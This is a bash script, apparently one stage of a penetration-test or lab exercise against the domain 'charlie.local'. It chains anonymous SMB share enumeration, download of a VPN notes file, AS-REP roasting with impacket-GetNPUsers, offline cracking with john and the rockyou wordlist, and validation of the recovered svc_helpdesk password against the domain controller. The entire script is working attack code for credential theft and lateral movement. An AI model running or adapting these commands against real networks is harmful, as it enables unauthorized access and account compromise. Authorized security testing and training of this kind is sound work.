#!/bin/bash
# =============================================================================
# M2 — Lateral movement via Kerberos misconfiguration (CHARLIE)  [VALIDATED]
#   2.1 anon SMB shares   2.2 read VPN notes   2.3 AS-REP roast + crack
# Run FROM Kali, tunnel up (M1 first).
# =============================================================================
set -u
FS=10.3.30.20
DC=10.3.30.10

echo "== M2.1 anonymous SMB shares on the file server =="
nxc smb "$FS" -u '' -p '' --shares 2>/dev/null | grep -iE "IT\\\$|Backups|READ"

echo "== M2.2 read the VPN setup notes (anon) =="
smbclient -N "//$FS/IT\$" -c 'get VPN_Setup_Notes.txt /tmp/notes.txt' 2>/dev/null
grep -iE "preauth|svc_helpdesk|account" /tmp/notes.txt | head -4

echo "== M2.3 AS-REP roast (accounts w/o Kerberos pre-auth) =="
printf 'reuben\nsvc_helpdesk\nhelpdesk_admin\nAdministrator\n' > /tmp/users.txt
impacket-GetNPUsers charlie.local/ -usersfile /tmp/users.txt -dc-ip "$DC" -no-pass -format hashcat 2>/dev/null \
  | grep -a 'krb5asrep' | tee /tmp/asrep.txt

echo "== M2.3 crack (rockyou + capitalize rule) =="
gunzip -kf /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 /tmp/asrep.txt 2>/dev/null
CR=$(john --show --format=krb5asrep /tmp/asrep.txt 2>/dev/null | grep '@CHARLIE' | head -1)
PW=$(echo "$CR" | cut -d: -f2)
echo "  recovered: svc_helpdesk : $PW"

echo "== M2 validate the cred over SMB against the DC =="
nxc smb "$DC" -u svc_helpdesk -p "$PW" 2>/dev/null | tail -1
echo "M2 PASS: svc_helpdesk credential recovered and valid."
